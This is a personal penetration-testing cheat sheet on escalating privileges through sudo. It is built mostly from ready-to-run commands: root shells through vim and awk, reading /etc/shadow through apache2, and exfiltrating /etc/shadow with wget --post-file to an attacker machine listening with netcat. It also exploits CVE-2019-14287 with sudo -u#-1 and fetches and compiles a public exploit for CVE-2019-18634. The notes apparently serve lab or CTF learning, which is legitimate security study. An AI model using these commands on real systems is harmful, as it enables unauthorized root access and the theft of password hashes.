-- -
Ways I've abused sudo to get privesc laterally or vertically.
#### Enum
![[Dark Arts/Privesc/Enumeration/Sudo#^767678|Sudo]]
If it outputs custom scripts/software, you can look into creative ways to abuse it. Otherwise, check each program output on [GTFOBins](https://gtfobins.github.io) and it will let you know if software is vulnerable or not, and how to exploit it if it is vulnerable. 
#### Vim/Vi
```bash
sudo vim -c ":!/bin/sh"
```
#### awk
```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

#### Apache
Sometimes, you will have a program that shows up in the enum that does not show up as exploitable in GFTOBins, but that doesn't mean it isn't possible to abuse, in this case you can put in the software into google: `apache privesc exploit`
This may come up with something like the following with a way it can be abused to privesc, in this case you get a file read on a file we shouldn't be able to read:
```bash
sudo apache2 -f /etc/shadow
```
#### wget
Similarly to above, you may not see wget in GTFOBins directly, but you can use it to get file access to files locked to root, so you can abuse wget to send yourself a file (like `/etc/shadow`) that you should not have access to:
```bash
# on attack box
nc -nvlp <listening port>
nc -nvlp 8001

# on target
sudo wget --post-file=<file path> <attack ip>:<listening port>
sudo wget --post-file=/etc/shadow 10.10.10.10:8001
```
#### CVE-2019-14287
#cve-2019-14287
Happens because sudo doesn't check the supplied user id, so by giving it `-u#-1`, the expression returns the ID `0` which is root's ID, and since sudo doesn't verify this ID, it executes bash as root. You can change the expression to be any user ID and take over that account, this isn't exclusive to root. 
```bash
# for situation where you run:
sudo -l

# and get the following output:
# (ALL, !root) /bin/bash

# This means you can run bash with sudo for any user on the system EXCEPT root.
# Trivially exploit to get root:
sudo -u#-1 /bin/bash

# And boom you have root!
```
#### CVE-2019-18634
#cve-2019-18634
Buffer overflow vulnerability in sudo. Key component is the version of sudo and that the `pwfeedback` setting is on. 
##### Enum
![[Sudo#^297150]]
##### Prepare exploit
[Exploit Source](https://github.com/saleemrashid/sudo-cve-2019-18634)
```bash
git clone https://github.com/saleemrashid/sudo-cve-2019-18634.git
cd sudo-cve-2019-18634/
gcc -o exploit exploit.c
```
##### exploit
```bash
# literally just run the exploit on the target
./exploit
```

#### Resources
- [GTFOBins](https://gtfobins.github.io)